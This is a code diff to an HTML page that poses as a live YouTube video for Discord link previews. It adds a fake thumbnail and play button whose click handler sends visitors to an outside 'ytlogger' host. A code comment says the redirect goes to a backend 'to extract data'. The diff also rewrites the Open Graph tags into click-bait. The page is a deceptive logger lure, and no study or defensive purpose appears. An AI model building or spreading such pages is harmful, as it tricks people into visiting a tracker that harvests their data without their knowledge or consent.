@@ -3,22 +3,14 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  
-  <!-- Título y Descripción para el navegador -->
   <title>Video en vivo - YouTube</title>
-  
-  <!-- Metadatos Open Graph para Discord, Facebook, etc. -->
-  <meta property="og:title" content="Video en vivo - YouTube">
-  <meta property="og:description" content="Haz clic para ver el video en vivo ahora.">
+
+  <!-- Open Graph para Discord -->
+  <meta property="og:title" content="🔴 En Vivo Ahora: No te lo pierdas">
+  <meta property="og:description" content="Haz clic para ver la transmisión en vivo.">
   <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
-  <meta property="og:url" content="https://tusitio.com/">
+  <meta property="og:url" content="https://ytlogger.onrender.com/index.html">
   <meta property="og:type" content="website">
-  
-  <!-- Metadatos adicionales para Twitter -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Video en vivo - YouTube">
-  <meta name="twitter:description" content="Haz clic para ver el video en vivo ahora.">
-  <meta name="twitter:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
 
   <style>
     body {
@@ -28,6 +20,7 @@
       justify-content: center;
       height: 100vh;
       margin: 0;
+      font-family: sans-serif;
     }
     .video-wrapper {
       position: relative;
@@ -56,12 +49,19 @@
   </style>
 </head>
 <body>
-  <a href="https://ytlogger.onrender.com">
-    <div class="video-wrapper">
-      <div class="thumbnail"></div>
-      <div class="play-button"></div>
-    </div>
-  </a>
+
+  <!-- Video falso -->
+  <div class="video-wrapper" onclick="trackClick()">
+    <div class="thumbnail"></div>
+    <div class="play-button"></div>
+  </div>
+
+  <script>
+    function trackClick() {
+      // Redirige al backend para extraer datos
+      window.location.href = "https://ytlogger.onrender.com/track";
+    }
+  </script>
+
 </body>
 </html>
-
